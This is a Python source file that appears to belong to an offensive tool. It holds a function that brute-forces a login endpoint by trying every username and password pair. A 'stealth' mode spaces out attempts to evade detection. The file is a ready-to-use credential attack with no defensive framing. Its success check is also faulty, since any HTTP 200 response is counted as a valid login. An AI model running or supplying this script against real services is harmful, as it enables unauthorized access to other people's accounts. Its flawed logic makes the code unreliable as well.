# core/brute.py

import requests
import time
from itertools import product
from typing import List, Tuple

def brute_force_login(
    url: str,
    usernames: List[str],
    passwords: List[str],
    stealth: bool = False,
    success_indicator: str = "Welcome",
    timeout: int = 5,
    delay: float = 1.5
) -> List[Tuple[str, str]]:
    """
    Attempts to brute-force login credentials against a target URL.

    Args:
        url (str): The login endpoint.
        usernames (List[str]): List of usernames to try.
        passwords (List[str]): List of passwords to try.
        stealth (bool): If True, adds a delay between attempts.
        success_indicator (str): Text or marker indicating success in response.
        timeout (int): HTTP request timeout in seconds.
        delay (float): Delay in seconds between attempts if stealth is enabled.

    Returns:
        List[Tuple[str, str]]: List of (username, password) pairs that succeeded.
    """
    successful_logins = []
    for username, password in product(usernames, passwords):
        try:
            response = requests.post(
                url,
                data={"username": username, "password": password},
                timeout=timeout
            )
            if success_indicator in response.text or response.status_code == 200:
                successful_logins.append((username, password))
                break  # Stop after first success. Remove if you want all successes.
        except requests.RequestException as ex:
            # Optionally log ex or handle specific exceptions
            continue
        if stealth:
            time.sleep(delay)
    return successful_logins
